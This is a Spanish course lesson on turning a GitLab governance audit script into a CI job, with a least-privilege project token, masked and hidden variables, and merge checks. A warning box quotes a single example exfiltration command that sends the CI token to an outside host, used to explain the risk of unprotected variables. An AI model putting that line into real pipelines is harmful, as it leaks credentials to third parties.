# La gobernanza en el pipeline

> En la Semana 07, `gobernanza.sh` se ejecutaba cuando te acordabas. Desde esta semana se ejecuta en cada merge request, sin que nadie se acuerde, con su propio token y con el resultado pegado a la merge request. Sigue sin bloquear: lo que cambia es que ya nadie puede decir que no lo vio.

---

## 🎯 Objetivos

- Convertir `scripts/gobernanza.sh` en un job sin cambiar el script
- Crear un token de acceso de proyecto con el mínimo de permisos
- Guardarlo como variable enmascarada y oculta, y entender qué protege eso y qué no
- Activar *Pipelines must succeed* y saber qué deja pasar
- Fusionar solo cuando `gobernanza` está en verde

---

## 1. Qué problema resuelve

El ADR-005 decidió que la auditoría **detecta y no bloquea**: el hook de la Semana 07 bloquea lo que puede ver en un push (firma, formato, `Approved-by:`), y lo que solo se ve con la merge request entera (dueños, issue, quién aprobó de verdad) lo detecta `gobernanza.sh`. Pero un detector que se ejecuta a mano detecta cuando alguien se acuerda. Como job, detecta siempre, y deja el resultado donde lo ve quien fusiona.

---

## 2. Cómo funciona

### 2.1 El job

```yaml
gobernanza:
  stage: test
  image: alpine:3.24.2
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
  allow_failure: true
  before_script:
    - apk add --no-cache bash curl jq
  script:
    - scripts/gobernanza.sh
```

| Línea | Por qué |
|---|---|
| `image: alpine:3.24.2` | El script necesita `bash`, `curl` y `jq`, no Node. Una imagen pequeña y fijada |
| `rules: merge_request_event` | Solo tiene sentido con una merge request: necesita `CI_MERGE_REQUEST_IID` |
| `allow_failure: true` | Detecta, no bloquea (ADR-005). Si falla, el pipeline queda en verde con aviso |
| `apk add` | Tres paquetes, unos segundos. Una imagen propia con ellos llega en la Semana 13 |
| `script: scripts/gobernanza.sh` | Sin argumentos: el script lee `CI_MERGE_REQUEST_IID` |

El script **no cambia**. Desde la Semana 07 lee `CI_API_V4_URL`, `CI_PROJECT_ID` y `CI_MERGE_REQUEST_IID` antes que las variables de tu `~/.bc-gitlab`, y `GOBERNANZA_TOKEN` antes que `GITLAB_TOKEN`. Necesita el bit de ejecución en Git (`100755`); si falta, el job falla con `Permission denied`.

### 2.2 El token: de proyecto, de solo lectura

La teoría 04 explicó por qué `CI_JOB_TOKEN` no basta: no puede leer aprobaciones, diffs ni los issues que cierra una merge request. Tampoco vale tu token personal: el job lo podría usar cualquiera que modifique el YAML, y actuaría como tú en toda la instancia.

Un **token de acceso de proyecto** (*project access token*) es un token de un usuario bot que solo es miembro de `app`:

| Parámetro | Valor | Por qué |
|---|---|---|
| `name` | `gobernanza-ci` | Se ve en la auditoría y en los miembros del proyecto |
| `access_level` | `20` (Reporter) | Lee merge requests, aprobaciones y archivos. No puede empujar, fusionar ni aprobar |
| `scopes[]` | `read_api` | Solo lectura por API. Sin `api`, sin `write_repository` |
| `expires_at` | Seis meses | Obligatorio. Caduca solo aunque nadie lo revoque |

Es **Free** en self-managed. En GitLab.com solo existe en Premium y Ultimate; allí, el sustituto sería un usuario de servicio con su token personal.

### 2.3 La variable: enmascarada y oculta, no protegida

El token llega al job como variable CI/CD del proyecto, `GOBERNANZA_TOKEN`:

| Atributo | Valor | Qué hace |
|---|:--:|---|
| `masked` | ✅ | Si el valor aparece en el log, se sustituye por `[MASKED]` |
| `hidden` | ✅ | Nadie puede volver a ver el valor en la interfaz ni en la API, ni siquiera un Maintainer. Solo se puede sustituir |
| `protected` | ❌ | Las variables protegidas solo llegan a ramas y tags protegidos. Los pipelines de merge request se ejecutan en la rama de origen, que no lo está: el job no recibiría el token |

`hidden` solo se puede activar al crear la variable (`masked_and_hidden=true`), y no se puede desactivar.

> [!WARNING]
> Una variable no protegida llega a **cualquier** pipeline de merge request, y el pipeline de una merge request se ejecuta con el `.gitlab-ci.yml` **de la merge request**, antes de que nadie la revise. Un Developer que añada `curl https://otro-sitio --data "$GOBERNANZA_TOKEN"` a un job se lleva el token: `masked` solo lo oculta del log, no del job. Por eso el token tiene el mínimo posible: leer un proyecto, como Reporter, durante seis meses. La Semana 10 trata esto en serio: variables protegidas, ámbitos de entorno, y qué secretos no deben llegar nunca a una merge request.

### 2.4 *Pipelines must succeed*

```bash
curl -s --request PUT "$API/projects/$P" -H "$H" \
  --data "only_allow_merge_if_pipeline_succeeds=true" \
  --data "allow_merge_on_skipped_pipeline=false"
```

| Situación | ¿Se puede fusionar? |
|---|:--:|
| Pipeline en verde | ✅ |
| Pipeline en verde con `gobernanza` en `❌` (`allow_failure`) | ✅ — **por eso hay que mirarlo** |
| Pipeline en rojo | ❌ `405`, `ci_must_pass` |
| Pipeline en curso | ❌ `ci_still_running`, salvo con fusión automática |
| Sin pipeline | ❌ |

La **fusión automática** (`auto_merge=true` en `PUT .../merge`) programa la fusión para cuando el pipeline termine en verde. Es Free. En `app` no se usa todavía: la fusión tiene que esperar también a que `gobernanza` diga `0 problema(s)`, y eso el pipeline no lo exige.

### 2.5 El ciclo de una merge request desde hoy

1. Se abre la merge request: su pipeline ejecuta `build`, `test`, `package` y `gobernanza`. `gobernanza` falla (`allow_failure`): aún nadie ha aprobado.
2. `revisor` aprueba.
3. Se lanza otro pipeline de la merge request (`POST .../merge_requests/<iid>/pipelines`): ahora `gobernanza` ve la aprobación.
4. Si `gobernanza` está en `success`, se fusiona.

Paso 3 y 4, en un bloque, el mismo de las prácticas:

```bash
PIPE=$(curl -s --request POST "$API/projects/$P/merge_requests/$MR/pipelines" -H "$H" | jq -r .id)
until curl -s -H "$H" "$API/projects/$P/pipelines/$PIPE" \
        | jq -e '.status | IN("success","failed","canceled")' > /dev/null; do sleep 10; done
curl -s -H "$H" "$API/projects/$P/pipelines/$PIPE/jobs" \
  | jq -e '.[] | select(.name == "gobernanza") | .status == "success"' > /dev/null && {
  SHA=$(curl -s -H "$H" "$API/projects/$P/merge_requests/$MR" | jq -r .sha)
  curl -s --request PUT "$API/projects/$P/merge_requests/$MR/merge" -H "$H" \
    --data-urlencode "sha=$SHA" --data-urlencode "squash=true" | jq '{state, squash_commit_sha}'
} || echo "gobernanza no está en verde: lee su log antes de fusionar"
```

Es el `bash scripts/gobernanza.sh "$MR" && { merge }` de la Semana 08, con la auditoría ejecutada por el runner y no por ti.

---

## 3. Cómo se configura

| Qué | Dónde |
|---|---|
| El token | `Settings → Access tokens`, o `POST /projects/:id/access_tokens` |
| La variable | `Settings → CI/CD → Variables`, o `POST /projects/:id/variables` |
| *Pipelines must succeed* | `Settings → Merge requests → Merge checks`, o `PUT /projects/:id` |

La práctica 04 hace los tres por API, sin que el token pase por ningún archivo ni por la pantalla.

---

## 4. Antipatrones

| Antipatrón | Por qué duele | Qué hacer en su lugar |
|---|---|---|
| Tu token personal como variable del proyecto | Cualquier merge request puede usarlo como tú, en toda la instancia | Token de proyecto, Reporter, `read_api` |
| Token sin caducidad o de un año "para no renovarlo" | Si se filtra, vale hasta que alguien se acuerde | Seis meses, y una alerta en la Semana 11 |
| `masked` como si fuera "seguro" | Solo protege el log | Mínimo privilegio, y la Semana 10 |
| Quitar `allow_failure` para "obligar" | Contradice el ADR-005 sin escribirlo; cada aprobación tardía deja el pipeline en rojo | Si se decide bloquear, un ADR nuevo primero |
| Mirar solo el color del pipeline | `gobernanza` puede estar en `❌` con el pipeline en verde | Comprobar el job antes de fusionar |

---

## 5. Trucos

- **El veredicto de `gobernanza` de una merge request**: `GET .../merge_requests/<iid>/pipelines` para el último pipeline, y en sus jobs, `select(.name=="gobernanza") | .status`.
- **Qué tokens tiene el proyecto y cuándo caducan**: `GET .../access_tokens | jq -r '.[] | "\(.name) \(.access_level) \(.scopes) \(.expires_at) \(.active)"'`.
- **Que la variable existe sin ver su valor**: `GET .../variables/GOBERNANZA_TOKEN | jq '{masked, hidden, protected, value}'`. `value` sale `null`: es lo esperado.

---

## 📚 Recursos Adicionales

- [Project access tokens](https://docs.gitlab.com/user/project/settings/project_access_tokens/) — roles, scopes, caducidad y el usuario bot
- [CI/CD variables](https://docs.gitlab.com/ci/variables/) — `masked`, `hidden` y `protected`, y sus requisitos
- [Auto-merge](https://docs.gitlab.com/user/project/merge_requests/auto_merge/) — fusión automática y *Pipelines must succeed*
- [Merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/) — en qué rama y con qué YAML se ejecutan

---

## ✅ Checklist de Verificación

- [ ] Sabes por qué `gobernanza.sh` no cambia al pasar a job
- [ ] Sabes por qué el token es de proyecto, Reporter y `read_api`
- [ ] Sabes por qué la variable no es protegida y qué riesgo se acepta
- [ ] Sabes qué deja pasar *Pipelines must succeed* y por qué se mira `gobernanza` aparte

---

[← Anterior: Caché](06-cache.md) · [Volver a la Semana 09](../README.md)
